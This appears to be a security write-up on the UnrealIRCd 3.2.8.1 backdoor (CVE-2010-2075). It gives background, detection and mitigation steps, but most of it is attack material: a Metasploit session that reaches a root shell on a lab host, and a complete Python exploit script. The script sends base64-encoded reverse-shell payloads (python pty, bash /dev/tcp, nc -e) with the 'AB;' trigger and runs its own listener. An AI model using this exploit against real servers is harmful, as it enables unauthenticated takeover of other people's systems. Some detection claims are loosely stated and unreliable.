![ZXF1t7efxd](https://github.com/user-attachments/assets/6dcbba92-d724-4fcb-aa51-dd6eee4dc67e)

The **UnrealIRCd 3.2.8.1 Backdoor** is associated with **CVE-2010-2075**, a well-known vulnerability that was introduced when the source code of the UnrealIRCd software was compromised. Below is detailed information about this backdoor and its associated CVE.

### **CVE ID**:
- **CVE-2010-2075**

### **Vulnerability Description**:
The **UnrealIRCd 3.2.8.1** source tarball was compromised and contained a backdoor. This backdoor allowed remote attackers to execute arbitrary commands on the affected server with the privileges of the user running the UnrealIRCd process (often root or another privileged account). The malicious code was inserted into the UnrealIRCd source code between November 2009 and June 2010, affecting version 3.2.8.1.

### **Backdoor Behavior**:
The backdoor allowed attackers to connect to the affected server and execute shell commands remotely without authentication. This made it extremely dangerous since it provided complete control over the server to anyone who exploited it.

#### Key Details:
- The backdoor was inserted into the official UnrealIRCd source package hosted on the official servers.
- The affected version was **3.2.8.1**, which was downloaded between **November 2009** and **June 2010**.
- The exploit was activated by sending a specially crafted command to the UnrealIRCd server.
- The backdoor allowed **remote code execution (RCE)**, which gave attackers full control over the server.

### **Impact**:
- **Remote Code Execution**: Attackers could remotely execute arbitrary commands with the privileges of the UnrealIRCd process.
- **Full System Compromise**: If the UnrealIRCd process was running as root, the attackers could fully compromise the system.

### **Exploit Details**:
The backdoor in UnrealIRCd 3.2.8.1 was simple in nature and allowed any connected user to send a specific string of data to the IRC server, causing it to execute arbitrary commands on the host system. This made any server running the affected version of UnrealIRCd vulnerable to remote attacks.

### **Exploit Using MSF**:
```bash
msfconsole
msf> use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unreal_ircd_3281_backdoor) > show targets
msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.0.31
msf exploit(unreal_ircd_3281_backdoor) > set TARGET 0
msf exploit(unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
msf exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.0.30
msf exploit(unreal_ircd_3281_backdoor) > set LPORT 4444  
msf exploit(unreal_ircd_3281_backdoor) > exploit
sessions -i 2

sessions 2
shell
root@metasploitable:/etc/unreal#
cd /root
root@metasploitable:/root# ls
ls
Desktop  reset_logs.sh  vnc.log
```
![7buA7iUQBLKbr6y6jZpe9S](https://github.com/user-attachments/assets/50c5bf1f-f741-4981-8bf0-7f0f314321b8)

### **Exploit Using Only Python**:

```bash
#!/usr/bin/python3
import argparse
import socket
import base64
import threading
import logging

# Configure logging
logging.basicConfig(
    filename='exploit_log.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# PayloadGenerator class to handle the generation of different payloads
class PayloadGenerator:
    def __init__(self, local_ip, local_port):
        self.local_ip = local_ip
        self.local_port = local_port
        logging.info(f"PayloadGenerator initialized with IP: {self.local_ip}, Port: {self.local_port}")

    def gen_payload(self, payload_type):
        base = base64.b64encode(payload_type.encode())
        return f'echo {base.decode()} |base64 -d|/bin/bash'

    def get_python_payload(self):
        return f'python -c "import os;import pty;import socket;tLnCwQLCel=\'{self.local_ip}\';EvKOcV={self.local_port};QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');QRRCCltJB.close();" '

    def get_bash_payload(self):
        return f'bash -i >& /dev/tcp/{self.local_ip}/{self.local_port} 0>&1'

    def get_netcat_payload(self):
        return f'nc -e /bin/bash {self.local_ip} {self.local_port}'

# ExploitSender class to send the exploit payload to the target
class ExploitSender:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        logging.info(f"ExploitSender initialized with target IP: {self.target_ip}, Port: {self.target_port}")

    def connect_to_target(self):
        try:
            logging.info(f"Attempting connection to target {self.target_ip}:{self.target_port}")
            self.socket = socket.create_connection((self.target_ip, self.target_port))
            logging.info("Connection to target established.")
        except socket.error as error:
            logging.error(f"Connection to target failed: {error}")
            print(f"Connection to target failed: {error}")
            return False
        return True

    def send_payload(self, payload):
        try:
            logging.info(f"Sending payload: {payload}")
            self.socket.sendall((f'AB; {payload} \n').encode())
            logging.info("Payload sent successfully.")
        except Exception as e:
            logging.error(f"Failed to send exploit: {e}")
            print(f"Failed to send exploit: {e}")
        finally:
            self.socket.close()

# Listener class to create a reverse shell listener
class Listener:
    def __init__(self, local_ip, local_port):
        self.local_ip = local_ip
        self.local_port = local_port
        logging.info(f"Listener initialized on {self.local_ip}:{self.local_port}")

    def start_listener(self):
        try:
            listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener_socket.bind((self.local_ip, self.local_port))
            listener_socket.listen(1)
            logging.info(f"Listening on {self.local_ip}:{self.local_port} for incoming connections...")
            print(f"Listening on {self.local_ip}:{self.local_port} for incoming connections...")
            conn, addr = listener_socket.accept()
            logging.info(f"Connection received from {addr}")
            print(f"Connection received from {addr}")
            self.handle_shell(conn)
        except Exception as e:
            logging.error(f"Error in listener: {e}")
            print(f"Error in listener: {e}")

    def handle_shell(self, conn):
        try:
            while True:
                cmd = input("Shell> ")  # You can type commands here to interact with the reverse shell
                if cmd.strip() == 'exit':
                    conn.close()
                    logging.info("Session closed by user")
                    break
                conn.send(cmd.encode() + b'\n')
                response = conn.recv(4096).decode()
                print(response)
                logging.info(f"Command executed: {cmd}, Response: {response.strip()}")
        except Exception as e:
            logging.error(f"Error handling shell: {e}")
            print(f"Error handling shell: {e}")

# Main class to coordinate the entire process
class ExploitFramework:
    def __init__(self, target_ip, target_port, payload_type, local_ip, local_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.payload_type = payload_type
        self.local_ip = local_ip
        self.local_port = local_port
        self.payload_generator = PayloadGenerator(self.local_ip, self.local_port)
        self.listener = Listener(self.local_ip, self.local_port)
        self.exploit_sender = ExploitSender(self.target_ip, self.target_port)

    def run(self):
        # Start the listener in a separate thread
        listener_thread = threading.Thread(target=self.listener.start_listener)
        listener_thread.start()

        # Connect to target and send the payload
        if self.exploit_sender.connect_to_target():
            if self.payload_type == 'python':
                payload = self.payload_generator.gen_payload(self.payload_generator.get_python_payload())
            elif self.payload_type == 'bash':
                payload = self.payload_generator.gen_payload(self.payload_generator.get_bash_payload())
            elif self.payload_type == 'netcat':
                payload = self.payload_generator.gen_payload(self.payload_generator.get_netcat_payload())
            self.exploit_sender.send_payload(payload)

# Argument Parsing for the script
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('target_port', help='Target port', type=int)
    parser.add_argument('-payload', help='Payload type', required=True, choices=['python', 'netcat', 'bash'])
    args = parser.parse_args()

    # Configure the local IP and port for listening
    local_ip = '192.168.0.200'  # CHANGE THIS to your attacker's IP
    local_port = 9595  # CHANGE THIS to the port you want to use for reverse shell

    # Initialize and run the framework
    framework = ExploitFramework(args.target_ip, args.target_port, args.payload, local_ip, local_port)
    framework.run()
```

```bash
python ircd_3281_backdoor_class.py 192.168.0.31 6667 -payload python
```

### **Affected Versions**:
- **UnrealIRCd 3.2.8.1**

Other versions of UnrealIRCd before and after 3.2.8.1 were not affected because they did not contain the malicious code.

### **Solution**:
The UnrealIRCd development team quickly responded after the discovery of the backdoor by:
- Removing the compromised tarball from their servers.
- Issuing a clean version of UnrealIRCd.
- Advising all users to upgrade to a version newer than 3.2.8.1.

The safest course of action was to immediately upgrade to a newer version, as the developers fixed the issue by removing the backdoor code.

### **How to Detect**:
If you are running UnrealIRCd and want to check whether your server was affected:
1. **Check the version**: If you're using UnrealIRCd 3.2.8.1, your server was compromised.
   ```bash
   /path/to/unrealircd --version
   ```
2. **Check the binary for known backdoor strings**:
   Search for the backdoor in the binary by looking for specific commands known to be associated with the backdoor. For example, you can use the `grep` command to search the binary:
   ```bash
   grep -a "AB;" /path/to/unrealircd
   ```
   If the backdoor is present, this command will return a string associated with the backdoor.

### **Mitigation**:
- **Upgrade UnrealIRCd**: The backdoor was fixed in later versions, so upgrade to a version newer than 3.2.8.1.
- **Reinstall the Operating System**: If your system was compromised, it’s strongly recommended to reinstall the operating system or restore from a known clean backup.
- **Run Security Tools**: Tools like `rkhunter`, `chkrootkit`, and `ClamAV` can be used to scan for malware and other backdoors, but the primary fix is to ensure that the compromised version is no longer in use.

### **References**:
- **CVE Database Entry**: [CVE-2010-2075](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075)
- **Original Advisory from UnrealIRCd**: [UnrealIRCd.org](https://forums.unrealircd.org/viewtopic.php?f=1&t=6568) – This provides detailed information about the backdoor and the recommended upgrade steps.
- **Exploit Database**: The backdoor exploit has been documented in the Exploit Database and is known to allow remote code execution without authentication.

### **Summary**:
- **CVE ID**: CVE-2010-2075
- **Description**: Remote code execution vulnerability due to a backdoor in UnrealIRCd 3.2.8.1.
- **Affected Versions**: UnrealIRCd 3.2.8.1
- **Severity**: High (Remote Code Execution)
- **Impact**: Complete system compromise.
- **Solution**: Upgrade to a later version and ensure you do not run version 3.2.8.1.

This vulnerability is particularly dangerous as it allows attackers full control of the system. If you find the compromised version installed on your system, it’s essential to upgrade and assess the damage caused by the potential exploit.
